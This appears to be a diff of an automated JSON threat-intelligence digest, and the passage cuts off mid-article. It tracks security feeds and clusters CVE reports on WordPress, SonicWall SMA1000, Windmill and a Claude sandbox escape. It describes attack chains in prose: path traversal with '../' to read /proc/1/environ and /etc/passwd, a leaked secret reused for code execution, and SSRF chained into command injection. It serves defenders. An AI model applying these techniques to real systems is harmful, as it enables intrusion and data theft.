@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-07-24T20:25:16.247801+00:00",
+  "generated_at": "2026-07-24T22:11:04.703599+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
   "feeds_ok": 76,
-  "total_items_in_window": 320,
-  "total_clusters_raw": 148,
-  "total_clusters_in_packet": 66,
-  "dropped_low_score": 82,
+  "total_items_in_window": 317,
+  "total_clusters_raw": 145,
+  "total_clusters_in_packet": 67,
+  "dropped_low_score": 78,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -74,19 +74,26 @@
       "item_count": 10,
       "in_window_count": 0
     },
+    "Microsoft Security Blog": {
+      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
     "Unit 42": {
       "url": "https://unit42.paloaltonetworks.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 15,
       "in_window_count": 1
-    },
-    "Google Threat Analysis Group": {
-      "url": "https://blog.google/threat-analysis-group/rss/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
     },
     "Trend Micro Research": {
       "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
@@ -102,61 +109,12 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+    "Google Threat Analysis Group": {
+      "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Microsoft Security Blog": {
-      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 1
-    },
-    "SANS Internet Storm Center": {
-      "url": "https://isc.sans.edu/rssfeed_full.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
-    "Citizen Lab": {
-      "url": "https://citizenlab.ca/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 4
-    },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Sekoia": {
       "url": "https://blog.sekoia.io/feed/",
@@ -165,6 +123,41 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Citizen Lab": {
+      "url": "https://citizenlab.ca/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 2
+    },
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
+    "SANS Internet Storm Center": {
+      "url": "https://isc.sans.edu/rssfeed_full.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 1
+    },
     "Cisco Talos": {
       "url": "https://feeds.feedburner.com/feedburner/Talos",
       "cohort": "threat_research_primary",
@@ -172,40 +165,19 @@
       "item_count": 15,
       "in_window_count": 3
     },
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 4
+    },
     "Horizon3 Attack Research": {
       "url": "https://horizon3.ai/feed/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 5
-    },
-    "ESET WeLiveSecurity": {
-      "url": "https://www.welivesecurity.com/en/rss/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "GitHub Security Lab": {
-      "url": "https://github.blog/category/security/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 0
+      "in_window_count": 4
     },
     "Volexity": {
       "url": "https://www.volexity.com/feed/",
@@ -214,6 +186,34 @@
       "item_count": 10,
       "in_window_count": 1
     },
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "ESET WeLiveSecurity": {
+      "url": "https://www.welivesecurity.com/en/rss/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
+    },
+    "GitHub Security Lab": {
+      "url": "https://github.blog/category/security/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
+    "PortSwigger Research": {
+      "url": "https://portswigger.net/research/rss",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 40,
+      "in_window_count": 0
+    },
     "Assetnote": {
       "url": "https://www.assetnote.io/resources/research/rss.xml",
       "cohort": "offensive_vulnerability_research",
@@ -221,11 +221,11 @@
       "item_count": 78,
       "in_window_count": 0
     },
-    "PortSwigger Research": {
-      "url": "https://portswigger.net/research/rss",
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 40,
+      "item_count": 50,
       "in_window_count": 0
     },
     "watchTowr Labs": {
@@ -270,6 +270,13 @@
       "item_count": 15,
       "in_window_count": 1
     },
+    "SpecterOps": {
+      "url": "https://medium.com/feed/specter-ops-posts",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
     "Elastic Security Labs": {
       "url": "https://www.elastic.co/security-labs/rss/feed.xml",
       "cohort": "detection_response_operations",
@@ -277,12 +284,12 @@
       "item_count": 20,
       "in_window_count": 4
     },
-    "SpecterOps": {
-      "url": "https://medium.com/feed/specter-ops-posts",
-      "cohort": "detection_response_operations",
+    "Orca Security Research": {
+      "url": "https://orca.security/resources/blog/feed/",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
+      "in_window_count": 10
     },
     "Datadog Security Labs": {
       "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
@@ -291,12 +298,12 @@
       "item_count": 30,
       "in_window_count": 0
     },
-    "Orca Security Research": {
-      "url": "https://orca.security/resources/blog/feed/",
-      "cohort": "cloud_identity_infrastructure",
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
+      "item_count": 20,
+      "in_window_count": 5
     },
     "Trail of Bits": {
       "url": "https://blog.trailofbits.com/feed/",
@@ -319,12 +326,12 @@
       "item_count": 100,
       "in_window_count": 0
     },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 5
+      "in_window_count": 1
     },
     "Permiso Security": {
       "url": "https://permiso.io/blog/rss.xml",
@@ -340,13 +347,6 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Sysdig": {
       "url": "https://sysdig.com/feed/",
       "cohort": "detection_response_operations",
@@ -361,19 +361,19 @@
       "item_count": 20,
       "in_window_count": 0
     },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Wiz Research": {
       "url": "https://www.wiz.io/feed/rss.xml",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 4
+    },
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Coveware": {
       "url": "https://www.coveware.com/blog?format=rss",
@@ -410,12 +410,12 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Interconnects": {
-      "url": "https://www.interconnects.ai/feed",
-      "cohort": "ai_security_agentic_risk",
+    "BleepingComputer": {
+      "url": "https://www.bleepingcomputer.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
+      "item_count": 15,
+      "in_window_count": 15
     },
     "The Record": {
       "url": "https://therecord.media/feed",
@@ -424,12 +424,19 @@
       "item_count": 5,
       "in_window_count": 5
     },
-    "BleepingComputer": {
-      "url": "https://www.bleepingcomputer.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
+    "Interconnects": {
+      "url": "https://www.interconnects.ai/feed",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 15
+      "item_count": 20,
+      "in_window_count": 2
+    },
+    "GreyNoise": {
+      "url": "https://www.greynoise.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
     },
     "SecurityWeek": {
       "url": "https://www.securityweek.com/feed/",
@@ -437,6 +444,13 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
+    },
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 17
     },
     "AI Snake Oil": {
       "url": "https://www.aisnakeoil.com/feed",
@@ -452,26 +466,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "GreyNoise": {
-      "url": "https://www.greynoise.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
-    },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 30,
-      "in_window_count": 17
-    },
     "Dark Reading": {
       "url": "https://www.darkreading.com/rss.xml",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 50,
-      "in_window_count": 23
+      "in_window_count": 24
     },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
@@ -480,32 +480,11 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 6
-    },
     "Krebs on Security": {
       "url": "https://krebsonsecurity.com/feed/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 1
-    },
-    "Team Cymru": {
-      "url": "https://www.team-cymru.com/post/rss.xml",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
-    },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 15,
       "in_window_count": 1
     },
     "Black Hills Information Security": {
@@ -515,15 +494,29 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Reddit r/netsec": {
-      "url": "https://www.reddit.com/r/netsec/.rss",
-      "cohort": "reddit_practitioner_osint",
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
+      "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
+      "item_count": 10,
+      "in_window_count": 6
     },
-    "Reddit r/sysadmin": {
-      "url": "https://www.reddit.com/r/sysadmin/.rss",
+    "Team Cymru": {
+      "url": "https://www.team-cymru.com/post/rss.xml",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
+    "Just Security": {
+      "url": "https://www.justsecurity.org/feed/",
+      "cohort": "policy_strategy_geopolitics",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
+    "Reddit r/cybersecurity": {
+      "url": "https://www.reddit.com/r/cybersecurity/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -536,15 +529,29 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Just Security": {
-      "url": "https://www.justsecurity.org/feed/",
-      "cohort": "policy_strategy_geopolitics",
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
+      "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
+      "item_count": 15,
+      "in_window_count": 1
+    },
+    "Reddit r/sysadmin": {
+      "url": "https://www.reddit.com/r/sysadmin/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Reddit r/netsecstudents": {
       "url": "https://www.reddit.com/r/netsecstudents/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Reddit r/msp": {
+      "url": "https://www.reddit.com/r/msp/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -557,26 +564,19 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 50
-    },
-    "Reddit r/msp": {
-      "url": "https://www.reddit.com/r/msp/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
     "Graham Cluley": {
       "url": "https://grahamcluley.com/feed/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 4
+    },
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 50
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -592,25 +592,25 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Reddit r/cybersecurity": {
-      "url": "https://www.reddit.com/r/cybersecurity/.rss",
+    "Reddit r/netsec": {
+      "url": "https://www.reddit.com/r/netsec/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
-      "in_window_count": 25
-    },
-    "tl;dr sec": {
-      "url": "https://tldrsec.com/feed.xml",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
+      "in_window_count": 22
     },
     "Embrace the Red": {
       "url": "https://embracethered.com/blog/index.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 100,
+      "in_window_count": 1
+    },
+    "tl;dr sec": {
+      "url": "https://tldrsec.com/feed.xml",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
       "in_window_count": 1
     },
     "Risky Business News": {
@@ -774,8 +774,8 @@
     {
       "cluster_id": "56fb338f87",
       "priority_score": 55,
-      "member_count": 10,
-      "corroborating_source_count": 9,
+      "member_count": 13,
+      "corroborating_source_count": 10,
       "strong_signals": [
         "CVE-2026-60137",
         "CVE-2026-63030",
@@ -816,7 +816,8 @@
           "tier_1_government",
           "tier_1_offensive_research",
           "tier_2_operator",
-          "tier_4_news"
+          "tier_4_news",
+          "tier_5_chatter"
         ]
       },
       "primary": {
@@ -1066,6 +1067,38 @@
           }
         },
         {
+          "source": "Reddit r/netsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "wp2shell (CVE-2026-63030): Pre-Auth RCE Chain in WordPress Core - Analysis and Open-Source Scanner",
+          "link": "https://www.reddit.com/r/netsec/comments/1v07npi/wp2shell_cve202663030_preauth_rce_chain_in/",
+          "published": "2026-07-18T21:17:40+00:00",
+          "summary": "submitted by /u/mazen160 [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "WordPress"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-63030"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "preauth_unauth"
+            ],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {
+              "WordPress": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
           "source": "The Hacker News",
           "cohort": "cyber_news_breach_reporting",
           "title": "WordPress wp2shell Exploitation Grows as Public Exploit Fuels Mass Scanning",
@@ -1153,149 +1186,6 @@
             "role_map": {
               "OpenAI/ChatGPT": "target",
               "WordPress": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "48ddf62f59",
-      "priority_score": 48,
-      "member_count": 2,
-      "corroborating_source_count": 2,
-      "strong_signals": [
-        "CVE-2026-15409",
-        "CVE-2026-15410",
-        "SonicWall"
-      ],
-      "taxonomy": {
-        "threat_categories": [
-          "active_exploitation"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "SonicWall"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-15409",
-          "CVE-2026-15410"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "actively_exploited",
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "news_report",
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research",
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Horizon3 Attack Research",
-        "cohort": "offensive_vulnerability_research",
-        "title": "CVE-2026-15409 / CVE-2026-15410 | SonicWall SMA1000 Server-Side Request Forgery and Code Injection Vulnerabilities",
-        "link": "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/",
-        "published": "2026-07-17T20:25:23+00:00",
-        "summary": "CVE-2026-15409 and CVE-2026-15410 are actively exploited SonicWall SMA1000 vulnerabilities that can be chained for unauthenticated system compromise. Learn how to validate exposure and verify remediation.",
-        "full_body": "SonicWall SMA1000 Server-Side Request Forgery and Code Injection Vulnerabilities CVE-2026-15409 and CVE-2026-15410 are actively exploited vulnerabilities affecting SonicWall Secure Mobile Access 1000 Series appliances. CVE-2026-15409 is a critical pre-authentication server-side request forgery vulnerability that can allow an unauthenticated attacker to reach services bound to the appliance’s local interface. CVE-2026-15410 is a post-authentication code injection vulnerability that can allow an attacker with administrator-level access to execute arbitrary operating system commands. The vulnerabilities have CVSS v3 scores of 10.0 (Critical) and 7.2 (High) , respectively, and both have been added to CISA’s Known Exploited Vulnerabilities Catalog. Technical Details CVE-2026-15409 is a server-side request forgery vulnerability in the SonicWall SMA1000 Appliance Work Place interface. A remote, unauthenticated attacker can exploit the vulnerability to cause the appliance to make requests to unintended locations. CVE-2026-15410 is a code injection vulnerability in the SMA1000 Appliance Management Console. Under specific conditions, a remote authenticated attacker with administrator privileges can execute arbitrary operating system commands. Attackers have been observed chaining the vulnerabilities. CVE-2026-15409 provides unauthenticated access to the internal service required to reach CVE-2026-15410, which can then be exploited to execute commands on the appliance. This chain can result in unauthenticated operating system command execution and full compromise of the affected device. CVE-2026-15409 CVSS v3: 10.0 (Critical) Vulnerability type: Server-Side Request Forgery Affected component: Appliance Work Place interface Attack vector: Network Authentication required: None Impact: Access to unintended locations, including services reachable only from the appliance CVE-2026-15410 CVSS v3: 7.2 (High) Vulnerability type: Code Injection Affected component: Appliance Management Console Attack vector: Network Authentication required: Administrator privileges under the vendor-described attack model Impact: Arbitrary operating system command execution Stop Guessing, Start Proving Schedule a demo NodeZero® Proactive Security Platform — Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether these vulnerabilities can be exploited in your environment. The test executes real attack techniques without causing damage, giving teams immediate clarity on exposure. Run the Rapid Response test: Launch from the NodeZero platform to determine whether CVE-2026-15409 or CVE-2026-15410 can be exploited. Patch immediately: Upgrade affected SMA1000 appliances to a fixed platform hotfix and perform the forensic review recommended by SonicWall. Re-run the test: Confirm the vulnerabilities are no longer exploitable after remediation. Indicators of Compromise SonicWall has published the following indicators associated with the active exploitation investigated under its advisory for CVE-2026-15409 and CVE-2026-15410. Indicator Type Description Log entry Requests to /__api__/login or /__api__/logout with an HTTP 200 status in extraweb_access.log Log entry Requests to /wsproxy containing suspicious host parameters with an HTTP 101 status in extraweb_access.log Log entry Hotfix rollback activity containing path traversal names in ctrl-service.log Configuration file Routes for /__api__/login or /__api__/logout in /var/lib/unit/conf.json; these routes are not part of a legitimate configuration Organizations that identify any of these indicators should follow SonicWall’s incident-response guidance. SonicWall recommends re-imaging affected physical appliances or redeploying virtual appliances, changing user and administrator passwords, and resetting time-based one-time password tokens. Affected Versions & Patch Affected The vulnerabilities affect SonicWall SMA1000 Series appliances running vulnerable builds in the 12.4.3 and 12.5.0 firmw",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "active_exploitation"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "SonicWall"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-15409",
-            "CVE-2026-15410"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "actively_exploited",
-            "preauth_unauth"
-          ],
-          "content_type": "vulnerability_disclosure",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {
-            "SonicWall": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Horizon3 Attack Research",
-          "cohort": "offensive_vulnerability_research",
-          "title": "CVE-2026-15409 / CVE-2026-15410 | SonicWall SMA1000 Server-Side Request Forgery and Code Injection Vulnerabilities",
-          "link": "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/",
-          "published": "2026-07-17T20:25:23+00:00",
-          "summary": "CVE-2026-15409 and CVE-2026-15410 are actively exploited SonicWall SMA1000 vulnerabilities that can be chained for unauthenticated system compromise. Learn how to validate exposure and verify remediation.",
-          "taxonomy": {
-            "threat_categories": [
-              "active_exploitation"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "SonicWall"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-15409",
-              "CVE-2026-15410"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "actively_exploited",
-              "preauth_unauth"
-            ],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {
-              "SonicWall": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Volexity",
-          "cohort": "threat_research_primary",
-          "title": "Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation",
-          "link": "https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/",
-          "published": "2026-07-17T22:10:37+00:00",
-          "summary": "In early July 2026, Volexity was engaged to perform an incident response investigation where it discovered a threat actor had successfully compromised SonicWall Secure Mobile Access (SMA) VPN appliances through […] The post Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation appeared first on Volexity .",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "SonicWall"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "SonicWall": "target"
             },
             "weak_tags": {
               "products": []
@@ -1760,8 +1650,8 @@
     {
       "cluster_id": "3574a7b873",
       "priority_score": 22,
-      "member_count": 6,
-      "corroborating_source_count": 6,
+      "member_count": 7,
+      "corroborating_source_count": 7,
       "strong_signals": [
         "Anthropic/Claude"
       ],
@@ -1778,7 +1668,9 @@
           "Google Cloud"
         ],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-46331"
+        ],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
@@ -1788,7 +1680,8 @@
         "confidence_tier": [
           "tier_1_primary_research",
           "tier_2_operator",
-          "tier_4_news"
+          "tier_4_news",
+          "tier_5_chatter"
         ]
       },
       "primary": {
@@ -1852,6 +1745,36 @@
             "role_map": {
               "Anthropic/Claude": "target",
               "AWS": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Reddit r/netsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "Escaping Claude Cowork’s local VM sandbox via CVE-2026-46331",
+          "link": "https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/",
+          "published": "2026-07-24T05:53:48+00:00",
+          "summary": "submitted by /u/natcoba [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Anthropic/Claude"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-46331"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {
+              "Anthropic/Claude": "target"
             },
             "weak_tags": {
               "products": []
@@ -2130,14 +2053,22 @@
         ],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [],
+        "affected_products": [
+          "AWS",
+          "WordPress"
+        ],
         "tools_used": [],
         "cve_ids": [
-          "CVE-2026-29059"
+          "CVE-2021-27137",
+          "CVE-2026-0770",
+          "CVE-2026-29059",
+          "CVE-2026-60137",
+          "CVE-2026-63030"
         ],
         "attack_techniques": [],
         "urgency_signals": [
           "actively_exploited",
+          "poc_available",
           "preauth_unauth"
         ],
         "content_type": [
@@ -2154,7 +2085,7 @@
         "link": "https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html",
         "published": "2026-07-22T12:36:36+00:00",
         "summary": "A high-severity security flaw impacting open-source developer platform Windmill has come under active exploitation in the wild, per VulnCheck. The vulnerability in question is CVE-2026-29059 (CVSS score: 7.5), a case of unauthenticated path traversal impacting Windmill's \"get_log_file\" endpoint (\"/api/w/{workspace}/jobs_u/get_log_file/{filename}\"). \"The filename parameter is concatenated into",
-        "full_body": "",
+        "full_body": "Hackers Exploit Windmill Flaw to Read Arbitrary Server Files Without Authentication  Ravie Lakshmanan  Jul 22, 2026 Vulnerability / Web Security A high-severity security flaw impacting open-source developer platform Windmill has come under active exploitation in the wild, per VulnCheck. The vulnerability in question is CVE-2026-29059 (CVSS score: 7.5), a case of unauthenticated path traversal impacting Windmill's \"get_log_file\" endpoint (\"/api/w/{workspace}/jobs_u/get_log_file/{filename}\"). \"The filename parameter is concatenated into a file path without sanitization, allowing an attacker to read arbitrary files on the server using ../ sequences,\" according to an advisory published by Windmill in March 2026. \"The primary sensitive value exposed by this vulnerability is the SUPERADMIN_SECRET environment variable, readable via /proc/1/environ. When set, this secret can be used as a Bearer token to authenticate as a superadmin and execute arbitrary code through the job preview API.\" However, it's worth noting that SUPERADMIN_SECRET is not set by default, and for standalone Windmill instances without SUPERADMIN_SECRET configured, the impact of the vulnerability is limited to arbitrary file read. The issue has since been addressed in Windmill 1.603.3, released in January 2026, by adding sanitization checks to the filename parameter to prevent directory traversal. According to VulnCheck, whose security researcher Valentin Lobstein is credited with discovering and reporting the flaw, exploitation efforts have been directed against Windmill's \"get_log_file\" endpoint to extract sensitive information from the \"/etc/passwd\" file. \"We've observed exploits aimed at both direct Windmill endpoints and the 